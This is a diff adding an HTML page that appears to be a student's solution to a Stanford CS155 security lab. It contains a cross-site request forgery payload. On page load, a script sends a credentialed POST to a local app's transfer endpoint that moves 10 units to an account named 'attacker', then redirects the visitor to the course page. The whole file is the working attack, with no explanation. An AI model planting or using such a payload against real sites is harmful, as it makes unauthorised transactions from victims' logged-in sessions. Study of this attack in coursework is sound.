@@ -1,0 +1,13 @@
+<html>
+	<body>
+		<script>
+			window.location = "http://crypto.stanford.edu/cs155/";
+			var req = new XMLHttpRequest();
+			var params = "destination_username=attacker&quantity=10";
+			req.open("POST","http://localhost:3000/post_transfer",false);
+			req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+			req.withCredentials = true;
+			req.send(params);
+		</script>
+	</body>
+</html>
